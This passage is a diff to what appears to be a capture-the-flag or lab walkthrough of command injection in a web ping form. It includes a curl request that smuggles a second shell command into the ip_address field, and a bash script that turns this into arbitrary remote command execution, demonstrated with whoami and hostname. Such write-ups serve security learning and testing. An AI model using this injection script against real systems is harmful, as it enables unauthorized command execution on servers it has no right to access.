@@ -105,4 +105,37 @@ Taking a look at the post request that was sent to the server to perform the pin
 curl 'http://178.128.163.152:32305/' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://178.128.163.152:32305/' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://178.128.163.152:32305' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0' --data-raw 'test=ping&ip_address=127.0.0.1%3Buname&submit=Test'
 
 ```
+Running tinker.sh I can see that I get the same output as I did with my POC:
+
+![image](https://user-images.githubusercontent.com/83407557/161610497-96c04432-637a-447a-bf73-51f6edeb1593.png)
+
+Now I need to modify tinker.sh to make my acutal exploit script, where I can give commands as arguments and get the output in the response. To do this I will change the line
+
+```
+--data-raw 'test=ping&ip_address=127.0.0.1%3Buname&submit=Test'
+```
+
+to 
+
+```
+--data-raw "test=ping&ip_address=127.0.0.1%3Bu$1&submit=Test"
+```
+to make it so instead of the uname command it will run the first argument I pass to my bash script.
+
+```bash
+#!/bin/bash
+
+curl 'http://178.128.163.152:32305/' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://178.128.163.152:32305/' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://178.128.163.152:32305' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0' --data-raw "test=ping&ip_address=127.0.0.1%3B$1&submit=Test"
+```
+
+Now I can run any number of commands, right from my command line:
+
+whoami command
+
+![image](https://user-images.githubusercontent.com/83407557/161611409-c8643e1e-64e3-46d3-879e-6f4ec51c84fb.png)
+
+hostname command:
+
+![image](https://user-images.githubusercontent.com/83407557/161611487-9d5c76d1-8d84-4f36-b8c4-f343f36e64ab.png)
+![image](https://user-images.githubusercontent.com/83407557/161611582-3fcec2f5-3a51-4a46-b98a-c0b34e7f06d3.png)
 
